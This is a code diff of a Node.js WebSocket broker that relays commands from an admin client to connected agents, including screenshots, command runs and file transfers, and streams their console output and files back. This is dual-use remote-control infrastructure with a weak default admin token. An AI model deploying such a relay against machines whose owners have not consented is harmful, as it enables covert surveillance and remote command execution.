@@ -1,15 +1,4 @@
-// Minimal Render-compatible WebSocket broker
-// Paths:
-//   /agent?token=...  -> Agent connections
-//   /admin?token=...  -> Admin client (your VB.NET Admin app)
-// Env:
-//   PORT (Render sets automatically)
-//   AGENT_TOKENS="token1,token2"
-//   ADMIN_TOKENS="admintoken1,admintoken2"
-
-const IDLE_TIMEOUT_MS = 120000; // 2 dk
-
-
+// server.js — soft idle heartbeat (no ws ping/pong)
 
 const http = require("http");
 const express = require("express");
@@ -33,157 +22,81 @@ const ADMIN_TOKENS = (process.env.ADMIN_TOKENS || "admintoken").split(",");
 const agents = new Map(); // agentId -> { ws, info }
 const admins = new Set(); // Set<ws>
 
+const IDLE_TIMEOUT_MS = 120000; // 2 dakika
+
 // helpers
 function sendJson(ws, obj) {
-  try { ws.send(JSON.stringify(obj)); } catch {}
+  try { ws.send(JSON.stringify(obj)); } catch (e) {}
 }
 function broadcastAdmins(obj) {
   const s = JSON.stringify(obj);
   for (const a of admins) {
-    if (a.readyState === WebSocket.OPEN) {
-      try { a.send(s); } catch {}
-    }
+    if (a.readyState === WebSocket.OPEN) { try { a.send(s); } catch {} }
   }
 }
 function parseQS(url) {
   const q = url.split("?")[1] || "";
   return new URLSearchParams(q);
 }
-
-// heartbeat (avoid idle timeouts)
 function markSeen(ws) {
   ws.lastSeen = Date.now();
 }
 
+// idle reaper (no ws.ping/pong)
 setInterval(() => {
   const now = Date.now();
+
   // agents
   for (const [aid, entry] of agents) {
     const ws = entry.ws;
-    if (!ws) continue;
-    if (ws.readyState !== WebSocket.OPEN) continue;
-    if (ws.lastSeen && now - ws.lastSeen > IDLE_TIMEOUT_MS) {
+    if (!ws || ws.readyState !== WebSocket.OPEN) continue;
+    if (ws.lastSeen && (now - ws.lastSeen) > IDLE_TIMEOUT_MS) {
       try { ws.terminate(); } catch {}
     }
   }
+
   // admins
   for (const ws of admins) {
-    if (!ws) continue;
-    if (ws.readyState !== WebSocket.OPEN) continue;
-    if (ws.lastSeen && now - ws.lastSeen > IDLE_TIMEOUT_MS) {
+    if (!ws || ws.readyState !== WebSocket.OPEN) continue;
+    if (ws.lastSeen && (now - ws.lastSeen) > IDLE_TIMEOUT_MS) {
       try { ws.terminate(); } catch {}
     }
   }
 }, 15000); // 15 sn’de bir kontrol
 
 wss.on("connection", (ws, req) => {
-  markSeen(ws);
-
-  ws.on("message", buf => {
-    markSeen(ws);
-    let msg; try { msg = JSON.parse(buf.toString()); } catch { return; }
-
-    // uygulama-level ping'e cevap ver (opsiyonel)
-    if (msg.type === "heartbeat" || msg.type === "ping") {
-      // istersen geri bir 'pong' da yolla
-      // sendJson(ws, { type: "pong", ts: Date.now() });
-      return;
-    }
-
-    // ... mevcut agent/admin mesaj işleme akışın ...
-  });
-
-  ws.on("close", () => {
-    // mevcut kapatma temizliğin
-  });
-});
-
-wss.on("connection", (ws, req) => {
-  installHeartbeat(ws);
   const url = req.url || "/";
   const isAgent = url.startsWith("/agent");
   const isAdmin = url.startsWith("/admin");
   const params = parseQS(url);
   const token = params.get("token") || "";
 
-  if (isAgent) {
-    if (!AGENT_TOKENS.includes(token)) {
-      sendJson(ws, { type: "error", message: "unauthorized agent" });
-      return ws.close();
+  markSeen(ws);
+
+  ws.on("message", (buf) => {
+    markSeen(ws);
+    let msg; try { msg = JSON.parse(buf.toString()); } catch { return; }
+
+    // Uygulama-level ping/heartbeat
+    if (msg.type === "heartbeat" || msg.type === "ping") {
+      // istersen anlık yanıt da ver:
+      // sendJson(ws, { type: "pong", ts: Date.now() });
+      return;
     }
-    ws.kind = "agent";
-    ws.agentId = null;
 
-    ws.on("message", (buf) => {
-      let msg; try { msg = JSON.parse(buf.toString()); } catch { return; }
-
+    if (ws.kind === "agent") {
       if (msg.type === "hello") {
         ws.agentId = msg.agentId || ("agent-" + Math.random().toString(36).slice(2, 8));
         agents.set(ws.agentId, { ws, info: msg });
         broadcastAdmins({ type: "agent_list", agents: [...agents.keys()] });
-
-      } else if (msg.type === "resp") {
-        // forward raw response to admins
-        broadcastAdmins({ type: "resp", agentId: ws.agentId, payload: msg });
-
-      } else if (msg.type === "file") {
-        // NEW: forward file transfer packets as top-level fields (no payload wrapper)
-        // Admin app expects: {type:"file", agentId, id, mode, name?, size?, seq?, data?, sha256?}
-        broadcastAdmins({
-          type: "file",
-          agentId: ws.agentId,
-          id: msg.id,
-          mode: msg.mode,
-          name: msg.name,
-          size: msg.size,
-          seq: msg.seq,
-          data: msg.data,
-          sha256: msg.sha256
-        });
-
-        } else if (msg.type === "console_chunk") {
-  broadcastAdmins({
-    type: "console_chunk",
-    agentId: ws.agentId,
-    id: msg.id,
-    stream: msg.stream,   // "stdout" | "stderr"
-    data: msg.data
-  });
-
-} else if (msg.type === "console_end") {
-  broadcastAdmins({
-    type: "console_end",
-    agentId: ws.agentId,
-    id: msg.id,
-    exitCode: msg.exitCode
-  });
-
-
-      } else if (msg.type === "error") {
-        // optional: surface agent-side errors to admins
-        broadcastAdmins({ type: "error", agentId: ws.agentId, message: msg.message || "agent error" });
+      } else if (msg.type === "resp" || msg.type === "file" || msg.type === "console_chunk" || msg.type === "console_end") {
+        broadcastAdmins({ type: msg.type, agentId: ws.agentId, payload: msg, ...msg });
       }
-    });
-
-    ws.on("close", () => {
-      if (ws.agentId && agents.has(ws.agentId)) {
-        agents.delete(ws.agentId);
-        broadcastAdmins({ type: "agent_list", agents: [...agents.keys()] });
-      }
-    });
-
-  } else if (isAdmin) {
-    if (!ADMIN_TOKENS.includes(token)) {
-      sendJson(ws, { type: "error", message: "unauthorized admin" });
-      return ws.close();
+      return;
     }
-    ws.kind = "admin";
-    admins.add(ws);
-    sendJson(ws, { type: "agent_list", agents: [...agents.keys()] });
 
-    ws.on("message", (buf) => {
-      let msg; try { msg = JSON.parse(buf.toString()); } catch { return; }
-      // expected: {type:'cmd', id:'uuid', cmd:'screenshot'|'run'|'getinfo'|'getfile'|'putfile_*'|..., target:'agentId', ...}
+    if (ws.kind === "admin") {
+      // {type:'cmd', id:'uuid', cmd:'...', target:'agentId', ...}
       if (msg.type === "cmd" && msg.target && msg.cmd) {
         const entry = agents.get(msg.target);
         if (entry && entry.ws.readyState === WebSocket.OPEN) {
@@ -192,21 +105,50 @@ wss.on("connection", (ws, req) => {
           sendJson(ws, { type: "error", message: "agent not available" });
         }
       }
-    });
+      return;
+    }
+  });
 
-    ws.on("close", () => { admins.delete(ws); });
+  ws.on("close", () => {
+    // agent disconnect cleanup
+    if (ws.kind === "agent" && ws.agentId && agents.has(ws.agentId)) {
+      agents.delete(ws.agentId);
+      broadcastAdmins({ type: "agent_list", agents: [...agents.keys()] });
+    }
+    // admin cleanup
+    if (ws.kind === "admin") {
+      admins.delete(ws);
+    }
+  });
 
-  } else {
-    sendJson(ws, { type: "error", message: "unknown path" });
-    ws.close();
+  if (isAgent) {
+    if (!AGENT_TOKENS.includes(token)) {
+      sendJson(ws, { type: "error", message: "unauthorized agent" });
+      return ws.close();
+    }
+    ws.kind = "agent";
+    ws.agentId = null;
+    return;
   }
+
+  if (isAdmin) {
+    if (!ADMIN_TOKENS.includes(token)) {
+      sendJson(ws, { type: "error", message: "unauthorized admin" });
+      return ws.close();
+    }
+    ws.kind = "admin";
+    admins.add(ws);
+    sendJson(ws, { type: "agent_list", agents: [...agents.keys()] });
+    return;
+  }
+
+  sendJson(ws, { type: "error", message: "unknown path" });
+  ws.close();
 });
 
+// accept /agent and /admin
 server.on("upgrade", (req, socket, head) => {
-  // accept WS for both /agent and /admin paths
   wss.handleUpgrade(req, socket, head, (ws) => wss.emit("connection", ws, req));
 });
 
 server.listen(PORT, () => console.log("WS broker listening on", PORT));
-
-
